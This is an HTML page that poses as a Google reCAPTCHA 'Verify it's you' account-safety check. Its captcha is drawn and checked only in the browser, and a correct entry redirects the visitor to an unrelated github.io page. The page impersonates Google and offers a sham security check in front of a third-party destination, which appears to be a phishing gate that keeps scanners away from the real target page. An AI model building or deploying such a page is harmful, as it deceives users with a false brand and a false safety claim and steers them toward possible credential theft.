<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google ReCaptcha</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --google-blue: #1a73e8;
            --google-blue-hover: #1765cc;
            --google-gray: #dadce0;
            --text-dark: #202124;
            --text-light: #5f6368;
            --error-red: #d93025;
            --success-green: #188038;
        }

        * {
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/f64ff684-b2f8-4c08-ac14-297dd9013c3c/df2n2dw-5ad34e54-ac81-4c5e-a028-e1c47c904b41.png/v1/fill/w_1192,h_670,q_70,strp/google_colors_by_jesssaysno_df2n2dw-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6Ii9mL2Y2NGZmNjg0LWIyZjgtNGMwOC1hYzE0LTI5N2RkOTAxM2MzYy9kZjJuMmR3LTVhZDM0ZTU0LWFjODEtNGM1ZS1hMDI4LWUxYzQ3YzkwNGI0MS5wbmciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.hA1hI2T19Uu6kYSYwSRzqOppoBrXiifphqPmDbm6CXA') no-repeat center center fixed;
            background-size: cover;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            width: 100%;
            max-width: 480px; /* Slightly wider to accommodate bigger captcha */
            padding: 48px 40px 36px;
            background-color: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border: 1px solid var(--google-gray);
            border-radius: 28px; 
            text-align: center;
            box-shadow: 0 4px 24px rgba(0,0,0,0.15);
            transition: box-shadow 0.2s ease;
        }

        @media (max-width: 450px) {
            .container {
                border: none;
                padding: 24px;
                border-radius: 0;
                background-color: #fff;
            }
        }

        .header-icons {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .custom-icon {
            height: 56px; /* Increased size */
            width: auto;
            object-fit: contain;
        }

        h1 {
            font-size: 26px;
            font-weight: 600;
            margin: 0 0 10px 0;
            color: var(--text-dark);
            letter-spacing: -0.02em;
        }

        p {
            color: var(--text-light);
            font-size: 16px;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .captcha-area {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 28px;
            border: 1px solid var(--google-gray);
            display: inline-block;
            width: 100%;
        }

        canvas {
            background: #ffffff;
            border-radius: 14px;
            cursor: pointer;
            border: 1px solid #eee;
            width: 100%; /* Make canvas responsive to container */
            max-width: 320px; /* Increased max width */
            height: auto;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }

        .input-group {
            position: relative;
            margin-bottom: 32px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 14px 20px;
            font-size: 16px;
            border: 1px solid var(--google-gray);
            border-radius: 14px;
            outline: none;
            transition: all 0.2s;
            color: var(--text-dark);
            font-family: inherit;
        }

        input:focus {
            border: 2px solid var(--google-blue);
            padding: 13px 19px;
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
        }

        .button-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }

        .text-button {
            background: none;
            border: none;
            color: var(--google-blue);
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            padding: 10px 16px;
            border-radius: 20px;
            transition: background 0.2s;
            font-family: inherit;
        }

        .text-button:hover {
            background: rgba(26, 115, 232, 0.08);
        }

        .primary-button {
            background-color: var(--google-blue);
            color: white;
            border: none;
            padding: 12px 28px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 24px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
        }

        .primary-button:hover {
            background-color: var(--google-blue-hover);
            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
            transform: translateY(-1px);
        }

        .primary-button:active {
            transform: translateY(0);
        }

        #message {
            margin-top: 12px;
            padding-left: 4px;
            font-size: 14px;
            height: 20px;
            font-weight: 500;
        }

        .error { color: var(--error-red); }
        .success { color: var(--success-green); }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.2s ease-in-out 0s 2;
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div class="header-icons">
        <img src="https://www.cpsmi.com/blog/wp-content/uploads/2025/10/Picture1.png" alt="Icon" class="custom-icon" onerror="this.style.display='none'">
    </div>
    
    <h1>Verify it's you</h1>
    <p>To help keep your account safe, complete this quick check.</p>

    <div class="captcha-area">
        <!-- Canvas dimensions increased in the JS init, styled here -->
        <canvas id="captchaCanvas" height="100" width="320" title="Click to refresh" onclick="initCaptcha()"></canvas>
    </div>

    <div class="input-group">
        <input type="text" id="captchaInput" placeholder="Enter the code you see" spellcheck="false" autocomplete="off">
        <div id="message"></div>
    </div>

    <div class="button-row">
        <button class="text-button" onclick="initCaptcha()">Refresh code</button>
        <button class="primary-button" id="submitBtn" onclick="handleVerify()">Next</button>
    </div>
</div>

<script>
    const canvas = document.getElementById('captchaCanvas');
    const ctx = canvas.getContext('2d');
    const input = document.getElementById('captchaInput');
    const message = document.getElementById('message');
    const submitBtn = document.getElementById('submitBtn');
    const container = document.getElementById('mainContainer');
    const REDIRECT_URL = "https://code-cat12.github.io/season/testing";
    
    let currentCaptcha = "";

    function generateCaptchaText() {
        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
        let result = "";
        for (let i = 0; i < 6; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    function initCaptcha() {
        currentCaptcha = generateCaptchaText();
        input.value = "";
        message.textContent = "";
        message.className = "";
        
        ctx.fillStyle = "#ffffff";
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Grid lines (subtle)
        ctx.strokeStyle = "#f1f3f4";
        ctx.lineWidth = 1;
        for (let i = 0; i < canvas.width; i += 25) {
            ctx.beginPath();
            ctx.moveTo(i, 0); ctx.lineTo(i, canvas.height);
            ctx.stroke();
        }

        // Noise lines
        for (let i = 0; i < 10; i++) {
            ctx.strokeStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
            ctx.beginPath();
            ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
            ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
            ctx.stroke();
        }

        const textDist = 45; // Increased spacing for larger canvas
        ctx.font = "bold 38px 'Inter', sans-serif";
        ctx.textBaseline = "middle";

        for (let i = 0; i < currentCaptcha.length; i++) {
            const x = 40 + i * textDist;
            const y = canvas.height / 2 + (Math.random() * 14 - 7);
            const angle = (Math.random() * 24 - 12) * Math.PI / 180;

            ctx.save();
            ctx.translate(x, y);
            ctx.rotate(angle);
            ctx.fillStyle = "#3c4043";
            ctx.fillText(currentCaptcha[i], 0, 0);
            ctx.restore();
        }
    }

    function handleVerify() {
        const userValue = input.value.trim().toUpperCase();
        
        if (userValue === currentCaptcha) {
            message.className = "success";
            message.textContent = "Verified. Redirecting...";
            input.disabled = true;
            submitBtn.disabled = true;
            submitBtn.textContent = "Loading...";
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 800);
        } else {
            message.className = "error";
            message.textContent = "Wrong code. Try again.";
            
            container.classList.add('shake');
            setTimeout(() => container.classList.remove('shake'), 400);
            
            initCaptcha();
            input.focus();
        }
    }

    input.addEventListener("keypress", (e) => {
        if (e.key === "Enter") handleVerify();
    });

    window.onload = initCaptcha;
</script>

</body>
</html>
